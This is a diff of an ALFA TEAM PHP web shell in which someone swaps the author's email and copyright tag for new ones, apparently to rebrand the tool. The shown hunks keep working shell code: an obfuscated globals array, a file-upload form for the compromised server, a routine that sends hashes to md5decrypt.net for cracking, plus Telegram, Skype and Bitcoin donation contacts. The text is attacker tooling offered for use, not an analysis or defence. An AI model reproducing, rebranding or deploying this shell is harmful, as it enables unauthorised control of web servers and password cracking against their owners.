@@ -3,7 +3,7 @@
 	Author: 	Leviathan Perfect Hunter
 	Telegram: 	https://t.me/Tony_33™
 	YouTube: 	https://youtube.com/Tony
-	Gmail:		rootaexdy@gmail.com
+	Gmail:		RootHack@gmail.com
 	Date:		Monday, September 14, 2025
 */
 $GLOBALS['oZgNypoPRU'] = array(
@@ -1562,7 +1562,7 @@ if(empty($about_us)){
 $about_us = "<pre><center><img src='https://imgku.io/download/kAEFoObn.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By ALFA TEAM (ALFA TEAM)</font><br>
-<font color='#00A220'>Contact : rootaexdy@gmail.com</font><br>
+<font color='#00A220'>Contact : RootHack@gmail.com</font><br>
 <font color='#00A220'>Telegram Channel: @solevisible</font><br>
 <font color='#FFCB01'>Skype : Tony_33™</font><br>
 <font color='#FFCB01'>Skype : Tony_33™</font><br>
@@ -2234,7 +2234,7 @@ if($_POST['alfa3'] == '>>'){
 $hash = $_POST['alfa2'];
 if(!empty($hash)){
 $hash_type = $_POST['alfa4'];
-$email = "rootaexdy@gmail.com";
+$email = "RootHack@gmail.com";
 $code = "7b9fa79f92c3cd96";
 $target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
 $resp = @file_get_contents($target);
@@ -2303,7 +2303,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./rootaexdy &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>rootaexdy[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/Tony_33™'>@Tony_33™</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./RootHack &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>RootHack[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/Tony_33™'>@Tony_33™</a></span></div></td>
 </tr>
 </table>
 </div>
